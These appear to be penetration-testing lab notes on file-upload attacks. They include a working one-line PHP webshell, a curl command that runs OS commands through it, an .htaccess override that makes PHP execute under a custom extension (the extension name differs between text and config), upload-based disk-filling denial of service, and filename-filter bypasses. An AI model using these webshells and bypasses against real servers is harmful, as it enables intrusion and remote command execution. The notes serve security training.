## Techniques for Uploading a Webshell

### Basic Webshell Upload (No Countermeasures)

1. Upload a legitimate image to see where the webserver saves the file.
2. Upload a PHP webshell and access the file with a GET request.
3. Use a parameter query with your command to be executed by the OS.

#### Example of a Basic Webshell

```php
<?php system($_GET['cmd']); ?>
```
This script takes a GET parameter and executes it using the system command.
#### Example of a Query

```bash
curl -X GET https://<target_url>/files/avatars/basic-web-shell.php?cmd=pwd
```

### Using .htaccess

**.htaccess** is a configuration file for a directory. You can overwrite it to bypass security measures like file extension checking.

#### Lab Example
- `.php` was blocked, so the webserver did not allow PHP file uploads.
- Created a `.htaccess` file, uploaded it, and allowed the execution of PHP files using the extension ".213dz" with the mod_php module:

```plaintext
# Enable PHP file execution for mod_php
AddHandler application/x-httpd-php .213hz

# Enable PHP file execution for PHP-FPM
<FilesMatch \.php$>
    SetHandler "proxy:unix:/path/to/php-fpm.sock|fcgi://localhost/"
</FilesMatch>

<FilesMatch "\.php$">
    Require all granted
</FilesMatch>
```

**Note:** Change the HTTP content-type in the body of the request to "Content-Type: plain/text". Now you can upload your PHP file with the extension ".213hz".

### Denial of Service (DOS)

1. Check if there is a size limit on the uploaded files.
2. If not, try to upload the largest file possible.
3. The goal is to fill up the webserver's disk space, causing it to crash.

### Directory Traversal

- Sometimes you can use this technique to upload a file to another directory where PHP execution is allowed.
- Use URL path encoding in Burp Repeater to try to save a file in a subdirectory of the intended directory.

### Obfuscation Techniques

Sometimes, the PHP code that checks the legitimacy of your file is not coded correctly. Depending on the code, these obfuscation techniques could work:

- **Multiple Extensions**: Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or a JPG image: `exploit.php.jpg`.
- **Trailing Characters**: Some components will strip or ignore trailing whitespaces, dots, and similar characters: `exploit.php.`.
- **URL Encoding**: Use URL encoding (or double URL encoding) for `"."`, `"../"`, or `".."`. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`.
- **Semicolons or Null Byte Characters**: Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, this can cause discrepancies in what is treated as the end of the filename: `exploit.php;.jpg` or `exploit.php%00.jpg`.
- **Multibyte Unicode Characters**: Use multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE`, or `xC0 xAE` may be translated to `x2E` if the filename is parsed as a UTF-8 string but then converted to ASCII characters before being used in a path.